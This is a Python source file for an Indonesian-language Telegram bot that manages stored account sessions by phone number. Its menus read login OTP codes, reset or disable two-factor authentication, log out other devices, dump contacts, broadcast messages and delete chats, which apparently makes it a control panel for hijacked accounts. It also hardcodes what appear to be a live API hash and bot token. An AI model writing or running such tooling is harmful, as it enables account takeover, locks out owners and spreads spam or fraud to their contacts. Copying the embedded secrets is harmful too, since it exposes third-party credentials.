import asyncio
import hashlib
import math
import os
import re
import pytz
from datetime import datetime
from warnings import filterwarnings
from configparser import ConfigParser
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ConversationHandler, filters, ContextTypes
from telegram.helpers import escape_markdown
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

# Import file lain
from invite_handler import invite_contacts
from config import GROUP_USERNAME_OR_ID, SESSION_FOLDER
from conversation_states import SET_PASSWORD
from get_otp import get_otp_handler
from sesi_aktif import sesi_aktif_handler
from device_info import device_info_handler
from data_kontak import data_kontak_handler
from hapus_pesan import hapus_pesan_handler
from set_password_handler import receive_confirmation, start_set_password, cancel_password
from logout_device import logout_other_devices
from broadcast import broadcast_via_dialog_handler
from security import check_2fa_status, remove_and_set_2fa
from disable_2fa import disable_2fa
from user_settings import update_interval_settings, stats_users
from state import STOP_FLAGS

# Konfigurasi
API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
BOT_TOKEN = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
STOP_FLAGS = {}

# ===== Fungsi Utility =====

def get_registered_sessions():
    return sorted(f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session'))

async def send_message_with_eraser(update_or_query, text, parse_mode=None, reply_markup=None):
    keyboard = reply_markup.inline_keyboard if reply_markup else []
    new_markup = InlineKeyboardMarkup(keyboard)

    if hasattr(update_or_query, "reply_text"):
        await update_or_query.reply_text(text, parse_mode=parse_mode, reply_markup=new_markup)
    elif hasattr(update_or_query, "edit_message_text"):
        await update_or_query.edit_message_text(text, parse_mode=parse_mode, reply_markup=new_markup)

# ===== Handler Command /user =====

async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_session_list(update, context, 1)

async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 1):
    sessions = get_registered_sessions()
    per_page = 10

    if not sessions:
        text = "❗ Tidak ada sesi yang terdaftar."
        if update.callback_query:
            await update.callback_query.edit_message_text(text)
        else:
            await update.message.reply_text(text)
        return

    total_pages = math.ceil(len(sessions) / per_page)
    page = max(1, min(page, total_pages))  # pastikan dalam range

    start = (page - 1) * per_page
    end = min(start + per_page, len(sessions))  # hindari index out of range
    current_sessions = sessions[start:end]

    keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_sessions]

    if total_pages > 1:
        page_buttons = [
            InlineKeyboardButton(
                f"[{p+1}]" if (p + 1) == page else str(p + 1),
                callback_data=f"page_{p+1}"
            ) for p in range(total_pages)
        ]
        keyboard.append(page_buttons)

    markup = InlineKeyboardMarkup(keyboard)
    text = "📱 Pilih nomor:"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=markup)
    else:
        await update.message.reply_text(text, reply_markup=markup)

# ===== Handle Select Nomor =====

async def handle_select_number(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await update.callback_query.message.reply_text(
                f"⚠️ Session yang dipilih *invalid atau belum login*: `{phone_number}`",
                parse_mode='Markdown'
            )
            await client.disconnect()
            return

        me = await client.get_me()
        await client.disconnect()

        full_name = escape_markdown((me.first_name or '') + ' ' + (me.last_name or ''), version=2) or 'Tidak ada nama'
        username = escape_markdown(me.username or 'Tidak ada username', version=2)
        bio = escape_markdown(me.bot and 'Bot Telegram' or me.phone or 'Tidak ada bio', version=2)
        location = escape_markdown(me.lang_code.upper() if me.lang_code else 'Tidak diketahui', version=2)
        local_time = datetime.now(pytz.timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')
        escaped_phone = escape_markdown(phone_number, version=2)

        info = (
            f"👤 *Info Akun*\n\n"
            f"🔹 *Nama*: {full_name}\n"
            f"🔹 *Username*: @{username}\n"
            f"🔹 *Bio*: {bio}\n"
            f"🔹 *Lokasi*: {location}\n"
            f"🕒 *Waktu*: {escape_markdown(local_time, version=2)} WIB\n\n"
            f"📱 Nomor: `{escaped_phone}`\n\nPilih aksi di bawah:"
        )

    except Exception as e:
        await update.callback_query.message.reply_text(
            f"⚠️ Session *corrupt atau tidak bisa dibuka* untuk `{phone_number}`:\n`{escape_markdown(str(e), version=2)}`",
            parse_mode='MarkdownV2'
        )
        return

    keyboard = [
        [
            InlineKeyboardButton("🔐 GET OTP", callback_data=f"getotp_{phone_number}"),
            InlineKeyboardButton("🟢 DEVICE AKTIF", callback_data=f"device_{phone_number}")
        ],
        [
            InlineKeyboardButton("📇 DAFTAR KONTAK", callback_data=f"datakontak_{phone_number}"),
            InlineKeyboardButton("📢 BROADCAST", callback_data=f"broadcast_{phone_number}")
        ],
        [
            InlineKeyboardButton("🔒 Verifikasi 2FA", callback_data=f"verify_2fa_menu_{phone_number}"),
            InlineKeyboardButton("👥 JOIN GRUP", callback_data=f"join_grup_{phone_number}")
        ],
        [
            InlineKeyboardButton("❌LOGOUT DEVICE", callback_data=f"logout_{phone_number}"),
            InlineKeyboardButton("🧹 HAPUS PESAN", callback_data=f"hapuspesan_{phone_number}")
        ],
        [
            InlineKeyboardButton("🧽 ERASE", callback_data=f"eraser_{phone_number}")
        ]
    ]

    await update.callback_query.message.reply_text(info, parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup(keyboard))


# ===== Semua Handler Tombol CallbackQuery =====

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    try:
        if data.startswith("page_"):
            page = int(data.split("_")[1])
            await send_session_list(update, context, page)

        elif data.startswith("select_"):
            phone_number = data.split("_", 1)[1]
            await handle_select_number(update, context, phone_number)

        elif data.startswith("getotp_"):
            phone_number = data.split("_", 1)[1]
            await get_otp_handler(update, context, phone_number, API_ID, API_HASH)

        elif data.startswith("device_"):
            phone_number = data.split("_", 1)[1]
            await device_info_handler(update, context, phone_number)

        elif data.startswith("datakontak_"):
            phone_number = data.split("_", 1)[1]
            await data_kontak_handler(update, context, phone_number)
            await send_back_button(update, phone_number)

        elif data.startswith("hapuspesan_"):
            phone_number = data.split("_", 1)[1]
            await hapus_pesan_handler(update, context, phone_number)
            await send_back_button(update, phone_number)

        elif data.startswith("join_grup_"):
            parts = data.split("_")
            if len(parts) > 2:
                phone_number = parts[2]
                await invite_contacts(update, context, phone_number)
            else:
                await query.message.reply_text("❌ Data tidak valid.")

        elif data.startswith("logout_"):
            phone_number = data.split("_", 1)[1]
            await logout_other_devices(update, context, phone_number)
            await send_back_button(update, phone_number)

        elif data.startswith("broadcast_"):
            phone_number = data.split("_", 1)[1]
            keyboard = [
                [InlineKeyboardButton("📨 Semua", callback_data=f"broadcastmode_all_{phone_number}"),
                 InlineKeyboardButton("👥 Kontak", callback_data=f"broadcastmode_contact_{phone_number}")],
                [InlineKeyboardButton("🟢 Grup", callback_data=f"broadcastmode_group_{phone_number}")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
            ]
            await query.message.reply_text("Pilih mode broadcast:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data.startswith("broadcastmode_"):
            _, mode, phone_number = data.split("_", 2)
            await broadcast_via_dialog_handler(update, context, phone_number, mode)
            await send_back_button(update, phone_number)

        elif data.startswith("verify_2fa_menu_"):
            phone_number = data.split("_", 3)[3]
            keyboard = [
                [InlineKeyboardButton("🔐 Cek/Ganti 2FA", callback_data=f"check_2fa_{phone_number}")],
                [InlineKeyboardButton("♻️ Reset dan Setel Ulang 2FA", callback_data=f"reset_2fa_{phone_number}")],
                [InlineKeyboardButton("❌ Nonaktifkan 2FA", callback_data=f"disable_2fa_{phone_number}")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
            ]
            await query.message.reply_text(f"🔐 Pilih tindakan untuk 2FA `{phone_number}`:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

        elif data.startswith("check_2fa_"):
            phone_number = data.split("_", 2)[2]
            await check_2fa_status(update, context, phone_number)

        elif data.startswith("reset_2fa_"):
            phone_number = data.split("_", 2)[2]
            await remove_and_set_2fa(update, context, phone_number)

        elif data.startswith("disable_2fa_"):
            phone_number = data.split("_", 2)[2]
            await disable_2fa(update, context, phone_number)

        elif data.startswith("eraser_"):
            try:
                await update.callback_query.message.delete()
            except Exception as e:
                await update.callback_query.message.reply_text(f"⚠️ Gagal menghapus pesan: {e}")

    except Exception as e:
        await query.message.reply_text(f"⚠️ Terjadi kesalahan: {str(e)}")


# ===== Fungsi Back Button ke Menu =====

async def send_back_button(update: Update, phone_number: str):
    keyboard = [
        [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"select_{phone_number}")]
    ]
    await update.callback_query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))


# ===== Main Application =====

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("user", user_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    print("✅ Bot aktif...")
    application.run_polling()

if __name__ == "__main__":
    main()
